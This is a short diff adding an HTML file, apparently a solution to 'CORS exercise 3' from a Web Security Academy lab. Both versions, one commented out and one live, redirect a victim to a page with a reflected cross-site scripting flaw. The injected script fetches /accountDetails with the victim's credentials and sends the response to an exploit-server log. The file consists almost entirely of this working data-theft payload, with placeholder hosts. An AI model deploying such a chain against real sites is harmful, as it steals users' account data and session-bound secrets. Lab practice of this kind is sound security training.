@@ -1,0 +1,30 @@
+<!-- CORS EXERCISE 3 XML HTTP VERSION -->
+
+<!--
+
+<html>
+<body>
+    <script>
+    document.location="http://stock.[labid].web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://[labid].web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-[exploit server id].exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+
+</body>
+</html>
+
+-->
+
+<!-- CORS EXERCISE 3 -->
+
+<html>
+<body>
+<script>
+document.location = "http://[labid].web-security-academy.net/?productId=4<script>fetch('https://[labid].web-security-academy.net/accountDetails', {credentials:'include'})
+    .then(r => r.text())
+    .then(txt => {
+        location='https://exploit-[exploit server id].exploit-server.net/log?key=' + encodeURIComponent(txt);
+    });%3c/script>&storeId=1";
+</script>
+</body>
+</html>
+
+
